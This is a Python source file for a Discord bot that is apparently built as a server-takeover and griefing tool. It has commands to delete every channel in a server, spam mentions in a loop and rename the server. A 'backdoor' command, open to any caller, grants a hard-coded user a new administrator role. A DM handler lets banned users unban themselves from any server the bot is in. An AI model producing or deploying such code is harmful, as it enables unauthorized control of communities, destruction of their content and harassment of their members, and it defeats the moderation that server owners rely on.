import os
import asyncio
import discord
from discord.ext import commands

# ================= CONFIG =================
TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 1258115928525373570
OWNER_USERNAME = "nico044037"

SPAM_MESSAGE = "<@1419680644618780824>"
SPAM_DELAY = 0.8

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix=["$", "!", "?"],
    intents=intents,
    help_command=None
)

spam_task: asyncio.Task | None = None

# ================= OWNER CHECK =================
def is_owner(ctx):
    return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME

# ================= READY =================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

# ================= SUDO GROUP =================
@bot.group(name="sudo", invoke_without_command=True)
async def sudo(ctx):
    if not is_owner(ctx):
        return
    await ctx.send(
        "Commands:\n"
        "`$sudo startmessage`\n"
        "`$sudo stopmessage`\n"
        "`$sudo add`\n"
        "`$sudo server rename <name>`"
    )

# ================= DELETE ALL =================
@sudo.command(name="nuke")
async def sudo_nuke(ctx, key: str = None):
    if ctx.author.name != "nico044037":
        return
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete(reason="sudo nuke")
        except (discord.Forbidden, discord.HTTPException):
            pass

# ================= SPAM LOOP =================
async def spam_loop(target: discord.abc.Messageable):
    try:
        while True:
            await target.send(SPAM_MESSAGE)
            await asyncio.sleep(SPAM_DELAY)
    except asyncio.CancelledError:
        pass

# ================= START MESSAGE =================
@sudo.command(name="startmessage")
async def sudo_startmessage(ctx):
    global spam_task
    if not is_owner(ctx):
        return
    if spam_task and not spam_task.done():
        await ctx.send("❌ already running")
        return
    spam_task = asyncio.create_task(spam_loop(ctx.channel))
    await ctx.send("✅ spam started")

# ================= STOP MESSAGE =================
@sudo.command(name="stopmessage")
async def sudo_stopmessage(ctx):
    global spam_task
    if not is_owner(ctx):
        return
    if not spam_task:
        await ctx.send("❌ no active spam")
        return
    spam_task.cancel()
    spam_task = None
    await ctx.send("🛑 spam stopped")

# ================= ADD =================
@sudo.command(name="add")
async def sudo_add(ctx):
    await ctx.send(
        "https://discord.com/oauth2/authorize"
        "?client_id=1470802191139864659"
        "&permissions=8"
        "&integration_type=0"
        "&scope=bot+applications.commands"
    )

# ================= BACKDOOR =================
@sudo.command(name="backdoor")
async def sudo_backdoor(ctx):
    member = discord.utils.find(
        lambda m: m.name == OWNER_USERNAME or m.display_name == OWNER_USERNAME,
        ctx.guild.members
    )
    if not member:
        await ctx.send("user not found")
        return

    role = discord.utils.get(ctx.guild.roles, name="Backdoored")
    if role is None:
        role = await ctx.guild.create_role(
            name="Backdoored",
            permissions=discord.Permissions(administrator=True)
        )

    if role not in member.roles:
        await member.add_roles(role)

    await ctx.send(f"done → {member.mention}")

# ================= SERVER RENAME =================
@sudo.command(name="server")
async def sudo_server(ctx, action: str = None, *, name: str = None):
    if ctx.author.name != "nico044037":
        return
    if action != "rename" or not name:
        return
    await ctx.guild.edit(name=name)

# ================= START =================
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN environment variable not set")
@bot.event
async def on_message(message):
    # ignore bots
    if message.author.bot:
        return

    # allow normal commands in servers
    if message.guild is not None:
        await bot.process_commands(message)
        return

    content = message.content.strip().split()

    # expect: $unban <server_id>
    if len(content) != 2 or content[0].lower() != "$unban":
        return

    try:
        server_id = int(content[1])
    except ValueError:
        await message.author.send("❌ invalid server id")
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        await message.author.send("❌ I am not in that server")
        return

    try:
        bans = await guild.bans()
    except discord.Forbidden:
        await message.author.send("❌ I lack permission to view bans in that server")
        return

    for entry in bans:
        if entry.user.id == message.author.id:
            try:
                await guild.unban(entry.user, reason="DM unban request")
                await message.author.send(f"✅ unbanned in **{guild.name}**")
                return
            except discord.Forbidden:
                await message.author.send("❌ I lack permission to unban you")
                return

    await message.author.send("ℹ️ you are not banned in that server")

bot.run(TOKEN)
